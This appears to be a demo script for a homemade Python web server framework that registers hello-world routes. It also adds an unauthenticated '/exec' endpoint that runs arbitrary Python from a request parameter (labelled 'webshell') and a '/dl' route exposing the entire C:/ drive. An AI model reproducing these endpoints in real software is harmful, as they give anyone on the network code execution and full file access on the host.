import interfaces
import server
import structs

# author: 程鹏博 景炎 2010
# date 2021-4-9


a = server.Server(('', 80), thread_limit = 8)
print(f'You can visit this server at {a.addr}')


@a.bind('/test')
def hello_world(request: structs.Request) -> structs.Response:
    s = f'hello world! from {request.addr}'
    return structs.Response(content = s)


@a.bind('/raw_test')
def raw_hello(request: structs.Request):
    s = f'hello world! from {request.addr}'
    request.conn.sendall(structs.Response(content = s).generate())


test = structs.Node()


@test.bind('/test')
def hello_world(request: structs.Request) -> structs.Response:
    s = f'hello world! from {request.addr}'
    return structs.Response(content = s)


@test.bind('/raw_test')
def raw_hello(request: structs.Request):
    s = f'hello world! from {request.addr}'
    request.conn.sendall(structs.Response(content = s).generate())


@a.bind('/exec')
def shell(request: structs.Request):
    command = compile(request.keyword['stmt'], 'webshell', 'single')
    exec(command)
    return structs.Response(content = 'Success')


a.bind('/t', test)
a.bind('/dl', interfaces.Folder('C:/'))
a.run()
